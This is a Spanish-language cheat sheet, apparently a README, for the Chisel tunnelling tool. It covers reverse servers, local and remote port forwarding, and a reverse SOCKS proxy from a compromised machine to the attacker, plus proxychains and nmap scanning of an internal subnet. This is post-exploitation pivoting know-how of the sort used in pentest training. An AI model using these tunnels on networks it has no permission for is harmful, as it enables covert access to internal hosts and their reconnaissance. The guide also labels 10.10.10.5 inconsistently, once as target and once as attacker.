<h1 align="center">Chisel Cheat Sheet</h1>

<p align="center">
  Fast reference guide for network pivoting, port forwarding, and reverse SOCKS tunnels encapsulation over HTTP.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Linux-111827?style=for-the-badge&logo=linux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Chisel-Pivoting-111827?style=for-the-badge&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/OffSec-Networks-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>

## Chisel es un único archivo ejecutable que funciona en dos modos:

  > Server (El que recibe): Se ejecuta en la máquina que va a escuchar las conexiones.
<br>

  > Client (El que inicia): Se ejecuta en la máquina que se conecta al servidor y define qué puertos quiere tunelizar.

```
chisel server --port 8000 --reverse
```
<a>o</a>
```
chisel server --port 8000 --reverse --tls-key clave.key --tls-cert certificado.crt
```
## Local Port Forwarding
```
chisel client 10.10.10.5:8000 8001:192.168.1.50:3306
```
> Recuerda 10.10.10.5 es la maquina objetivo. Resultado: Ahora, si vas al puerto 8001 de tu propia máquina (localhost:8001), estarás hablando directamente con el puerto 3306 de la máquina interna oculta.

## Remote Port Forwarding
```
chisel client 10.10.10.5:8000 R:8080:192.168.1.50:80
```
> Resultado: Se abrirá el puerto 8080 en tu máquina de atacante. Todo el que se conecte ahí será redirigido al puerto 80 de la máquina interna 192.168.1.50.
## Explicacion detallada
Le estás dando las siguientes instrucciones a Chisel:
chisel client 10.10.10.5:8000: "Oye, Chisel, conéctate como cliente a la máquina del atacante (10.10.10.5) que está escuchando en el puerto 8000". (Esto establece el puente seguro).
R: (Remote / Inverso): "Le voy a pedir un favor al servidor del atacante. Quiero que abra un puerto allá, en su propia casa (remotamente)".
:8080:: "El puerto que quiero que abra el atacante en su máquina es el 8080".
:192.168.1.50:80: "Y cuando alguien en la máquina del atacante meta datos por ese puerto 8080, tú (máquina comprometida) recíbelos a través del puente y reenvíaselos al puerto 80 de la máquina interna 192.168.1.50".

## Sockets

```
chisel server --port 8000 --reverse
```

```
chisel client 10.10.10.5:8000 R:socks
```
> Chisel abrirá por defecto un proxy SOCKS5 en el puerto 1080 de tu máquina de atacante.

```
nano /etc/proxychains4.conf
```
```
socks5 127.0.0.1 1080
```
```
proxychains nmap -sT -Pn 192.168.1.0/24
```
Podremos scanear la red por la segunda tarjeta de red de la maquina comprometida.
